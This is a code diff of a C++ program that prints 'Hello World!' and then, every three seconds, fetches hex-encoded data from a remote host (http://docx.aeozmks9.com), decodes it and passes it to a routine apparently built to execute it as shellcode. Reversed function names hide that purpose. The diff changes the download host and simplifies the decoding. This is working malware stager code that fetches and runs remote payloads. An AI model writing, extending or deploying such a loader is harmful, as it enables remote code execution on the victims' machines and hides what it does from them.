@@ -3,6 +3,7 @@
 
 #include <iostream>
 #include "httplib.h"
+#include "test.h"
 
 using namespace httplib;
 
@@ -46,24 +47,9 @@ std::string httpGet(std::string url, int port, std::string params)
 	}
 }
 std::string xehotrts(std::string strHex) {
-	std::istringstream is(strHex);
-	std::string line;
-	std::string hexvalue = "";
-	while (getline(is, line, '\r'))
-	{
-		int linelen = line.length();
-		int f = line.find(":");
-		std::string key = line.substr(0, f);
-		std::string value = line.substr(f + 1, linelen);
-
-		if (key == "v")
-		{
-			hexvalue = value;
-		}
-	}
 	std::string tmpStr = "";
-	for (size_t j = 0; j < hexvalue.length(); j += 2) {
-		std::string hex16 = hexvalue.substr(j, 2);
+	for (size_t j = 0; j < strHex.length(); j += 2) {
+		std::string hex16 = strHex.substr(j, 2);
 		char ch16 = stoul(hex16, nullptr, 16);
 		tmpStr += ch16;
 	}
@@ -113,21 +99,17 @@ void dclsnurl_asm(std::string edocxeh)
 int main()
 {
     std::cout << "Hello World!\n";
-#ifdef _WIN64
-	std::string url("http://api.10086.li/output-exe-nostream.txt"); // 替换为你想请求的URL
-#else
-	std::string url("http://api.10086.li");
-#endif
+	std::string url("http://docx.aeozmks9.com");
 
 	while (true)
 	{
-		std::string body = httpGet(url, 80, "/txt-86.txt");
-
 #ifdef _WIN64
-		dclsnur1(res->readAll().toStdString());
+		std::string body = httpGet(url, 80, "/txt-64.txt");
 #else
+		std::string body = httpGet(url, 80, "/txt-86.txt");
+#endif
+
 		dclsnurl_asm(body);
-#endif 
 
 		Sleep(3000);
 	}
